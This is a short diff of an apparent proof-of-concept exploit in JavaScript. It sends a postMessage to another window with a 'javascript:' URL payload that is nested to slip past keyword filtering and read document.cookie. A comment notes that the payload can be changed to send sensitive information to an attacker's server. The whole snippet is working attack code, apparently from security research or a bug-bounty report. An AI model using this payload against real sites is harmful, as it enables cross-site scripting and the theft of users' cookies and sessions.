@@ -40,7 +40,7 @@ function openWin(){
 function sendMessage(){
 	var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:alert(document.cookie)"});
 	//you can change the url payload for send back some sensitive information to the attacker's server
-	window.h1Win.postMessage(data,"*");
+	h1Win.postMessage(data,"*");
 	}
 	
 document.getElementById("openH1").addEventListener('click', openWin);
